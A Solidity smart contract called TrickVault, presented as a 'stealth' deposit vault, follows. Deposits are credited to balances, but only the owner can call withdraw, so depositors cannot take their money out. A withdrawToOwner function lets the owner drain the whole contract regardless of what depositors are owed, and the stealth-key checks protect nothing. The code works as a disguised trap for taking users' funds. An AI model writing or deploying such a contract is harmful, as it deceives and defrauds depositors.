// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract TrickVault {
    address public owner;
    uint256 public totalDeposited;

    mapping(bytes32 => bool) public usedStealthKeys;
    mapping(address => uint256) public stealthBalances;

    event Deposit(address indexed depositor, uint256 amount, bytes32 stealthKeyHash);
    event Withdraw(address indexed recipient, uint256 amount, bytes32 stealthKeyHash);
    event StealthKeyUsed(bytes32 keyHash);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {
        deposit(msg.sender, bytes32(0));
    }

    function deposit(address depositor, bytes32 stealthKeyHash) public payable {
        require(msg.value > 0, "Zero amount");

        if (stealthKeyHash != bytes32(0)) {
            require(!usedStealthKeys[stealthKeyHash], "Key already used");
            usedStealthKeys[stealthKeyHash] = true;
            emit StealthKeyUsed(stealthKeyHash);
        }

        stealthBalances[depositor] += msg.value;
        totalDeposited += msg.value;

        emit Deposit(depositor, msg.value, stealthKeyHash);
    }

    function withdraw(address payable recipient, uint256 amount, bytes32 stealthKeyHash) external onlyOwner {
        require(stealthBalances[recipient] >= amount, "Insufficient balance");
        require(address(this).balance >= amount, "Contract insufficient balance");

        stealthBalances[recipient] -= amount;

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Transfer failed");

        emit Withdraw(recipient, amount, stealthKeyHash);
    }

    function withdrawToOwner(uint256 amount) external onlyOwner {
        require(address(this).balance >= amount, "Contract insufficient balance");

        (bool success, ) = payable(owner).call{value: amount}("");
        require(success, "Transfer failed");
    }

    function getStealthBalance(address stealthAddress) external view returns (uint256) {
        return stealthBalances[stealthAddress];
    }

    function isStealthKeyUsed(bytes32 keyHash) external view returns (bool) {
        return usedStealthKeys[keyHash];
    }
}